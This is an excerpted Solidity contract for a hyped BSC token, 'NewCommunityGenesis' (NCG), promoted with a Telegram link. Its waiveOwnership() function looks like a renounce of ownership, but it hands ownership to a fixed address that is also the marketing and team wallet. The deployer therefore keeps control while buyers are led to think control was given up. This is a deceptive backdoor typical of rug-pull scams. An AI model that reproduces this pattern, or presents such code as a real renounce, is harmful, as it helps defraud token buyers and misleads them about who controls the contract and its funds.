...
/**
   NEW HYPE ALPHA PLAY 
   https://t.me/NewCommunityGenesisBSC
*/
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0xeA08Abef8a2888e1b39429A8A843052a89E647e5));
        _owner = address(0xeA08Abef8a2888e1b39429A8A843052a89E647e5);
    }
...
contract NewCommunityGenesis is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "NewCommunityGenesis";
    string private _symbol = "NCG";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xeA08Abef8a2888e1b39429A8A843052a89E647e5);
    address payable public teamWalletAddress = payable(0xeA08Abef8a2888e1b39429A8A843052a89E647e5);
